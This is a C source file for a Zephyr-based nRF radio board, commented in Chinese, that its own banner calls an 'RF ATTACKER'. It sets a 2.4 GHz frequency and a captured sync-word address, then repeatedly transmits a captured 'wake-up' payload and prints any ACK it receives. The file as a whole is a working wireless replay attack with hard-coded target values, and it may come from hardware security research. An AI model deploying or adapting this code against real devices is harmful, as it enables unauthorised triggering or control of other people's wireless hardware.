#include <zephyr/kernel.h>
#include <zephyr/sys/printk.h>
#include <hal/nrf_radio.h>
#include <zephyr/usb/usb_device.h>
#include <zephyr/drivers/gpio.h>
#include <string.h>

// ================= USER SETTINGS (改這裡!) =================

// 1. 設定頻率 (例如 78 = 2478 MHz)
#define TARGET_FREQ  78 

// 2. 設定地址 (PyOCD 抓到的 Sync Word)
// 格式: 0xD235CF35
#define TARGET_ADDR  0xD235CF35

// 3. 設定喚醒指令 (Payload)
// 這是你抓到的: 23 C3 00 C0 13 E3 63 A3 00 00 00 01
static const uint8_t TARGET_PAYLOAD[] = {
    0x23, 0xC3, 0x00, 0xC0, 0x13, 0xE3, 0x63, 0xA3, 
    0x00, 0x00, 0x00, 0x01
};

// 4. 發送間隔 (毫秒)
#define TX_INTERVAL_MS  500

// ==========================================================

#define LED0_NODE DT_ALIAS(led0)
static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);

static uint8_t packet_buffer[64];
static uint8_t rx_buffer[64];

void radio_disable(void) {
    NRF_RADIO->SHORTS = 0;
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;
}

void radio_init(void) {
    NRF_RADIO->POWER = 0;
    k_busy_wait(500);
    NRF_RADIO->POWER = 1;

    // 設定為 BLE 2M (如果失敗，下次改這裡換成 NRF_RADIO_MODE_NRF_1MBIT 試試)
    NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 

    // 封包格式 (Raw Payload)
    NRF_RADIO->PCNF0 = (8UL << RADIO_PCNF0_LFLEN_Pos);
    NRF_RADIO->PCNF1 = (60UL << RADIO_PCNF1_MAXLEN_Pos) | 
                       (4UL  << RADIO_PCNF1_BALEN_Pos) | 
                       (1UL  << RADIO_PCNF1_ENDIAN_Pos);

    NRF_RADIO->FREQUENCY = TARGET_FREQ;
    NRF_RADIO->CRCCNF = 0; // 預設關閉 CRC，想開改這裡

    // 設定地址
    NRF_RADIO->BASE0 = TARGET_ADDR;
    NRF_RADIO->PREFIX0 = 0x00;
    NRF_RADIO->RXADDRESSES = 1; 
}

void send_and_listen(void) {
    // 1. 準備 Payload
    memcpy(packet_buffer, TARGET_PAYLOAD, sizeof(TARGET_PAYLOAD));
    
    radio_disable();

    // 2. 設定 TX
    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;
    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk; 
    NRF_RADIO->EVENTS_END = 0;

    // 3. 發射
    // printk("TX...\n"); // 註解掉以減少延遲
    NRF_RADIO->TASKS_TXEN = 1;
    while (NRF_RADIO->EVENTS_END == 0); 
    NRF_RADIO->EVENTS_END = 0;
    
    // 4. ★ 極速切換到 RX (監聽 ACK) ★
    NRF_RADIO->TASKS_DISABLE = 1;
    while (NRF_RADIO->EVENTS_DISABLED == 0);
    NRF_RADIO->EVENTS_DISABLED = 0;

    NRF_RADIO->PACKETPTR = (uint32_t)rx_buffer;
    NRF_RADIO->TASKS_RXEN = 1; 

    // 5. 等待回應 (視窗 20ms)
    int64_t timeout = k_uptime_get() + 20; 
    bool ack_received = false;

    while (k_uptime_get() < timeout) {
        if (NRF_RADIO->EVENTS_END) {
            ack_received = true;
            break;
        }
        k_busy_wait(10); 
    }

    // 6. 輸出結果
    if (ack_received) {
        int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
        NRF_RADIO->TASKS_DISABLE = 1; 
        
        printk(">>> [ACK RECEIVED!] RSSI: %d\n", rssi);
        printk("    Data: ");
        for(int i=0; i<10; i++) printk("%02X ", rx_buffer[i]);
        printk("\n");
        
        // 抓到 ACK 就狂閃燈
        for(int i=0;i<5;i++) {
            gpio_pin_toggle_dt(&led);
            k_busy_wait(50000);
        }
    } else {
        radio_disable();
        // printk("."); // 沒收到就印個點，證明還活著
    }
}

int main(void) {
    usb_enable(NULL);
    
    if (device_is_ready(led.port)) {
        gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
    }

    printk("\n=== RF ATTACKER STARTED ===\n");
    printk("Freq: %d MHz\n", 2400 + TARGET_FREQ);
    printk("Addr: %08X\n", TARGET_ADDR);

    radio_init();

    while (1) {
        send_and_listen();
        
        gpio_pin_toggle_dt(&led); // 慢閃代表運作中
        k_sleep(K_MSEC(TX_INTERVAL_MS));
    }
}
